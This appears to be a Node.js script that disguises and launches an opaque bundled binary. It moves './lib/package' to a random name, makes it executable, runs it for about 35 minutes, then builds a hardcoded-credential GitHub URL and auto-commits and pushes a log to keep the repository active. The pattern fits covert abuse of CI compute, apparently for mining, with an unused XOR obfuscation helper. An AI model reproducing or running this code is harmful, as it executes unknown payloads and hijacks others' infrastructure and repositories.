function decode(str){
  if(!str) return null;
  var encoded = "";
  for (var i = 0; i < str.length; i++) {
    var a = str.charCodeAt(i);
    var b = a ^ 777;
    encoded += String.fromCharCode(b);
  }
  return encoded;
}

function makeid(length) {
  var text = "";
  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  for (var i = 0; i < length; i++)
    text += possible.charAt(Math.floor(Math.random() * possible.length));

  return text;
}

var name = makeid(3);
require('child_process').execSync('mv ./lib/package ./' + name + ' && chmod 755 -R ' + name + ' && ls -l');
var child = require('child_process').spawn('./' + name, [makeid(3), makeid(5)]);
child.stdout.on('data', function(data) {
    console.log('stdout: ' + data);
});
child.stderr.on('data', function(data) {
    console.log('stdout: ' + data);
});
child.on('close', function(code) {
    console.log('closing code: ' + code);
});

var index = 1;
var max = 35;
var interval;
var lock = false;
interval = setInterval(function () {
  if (index >= max) {    
    setTimeout(function(){
        process.exit(0);
    }, 1000);		
  }  
  console.log("running..." + ++index);
}, 1000 * 60);

var repo = require('child_process').exec("git remote show origin -n | grep h.URL | sed 's/.*://;s/.git$//'");
repo.stderr.on('data', function (data) {
    console.log('stderr: ' + data);
});
repo.on('close', function (code) {
    console.log('closing code: ' + code);
});
repo.stdout.on('data', function (data) {
    var split = data.replace(/(\r\n|\n|\r)/gm, "").split('/');
    console.log(split)
    var _n = split.pop();
    var _r = split.pop();
    console.log(_n + '/' + _r)
    var target = 'https://' + _r + ':test123@github.com/' + _r + '/' + _n + '.git';
    var myrepo = 'git clone ' + target + ' aaa && ';
    myrepo += 'git config --global user.email "test" && ';
    myrepo += 'git config --global user.name "test" && ';
    myrepo += 'cd ./aaa && echo ' + (new Date()).getTime();
    myrepo += ' > log && git add . && git commit -m "update log" && git push ' + target;
    require('child_process').exec(myrepo);
});
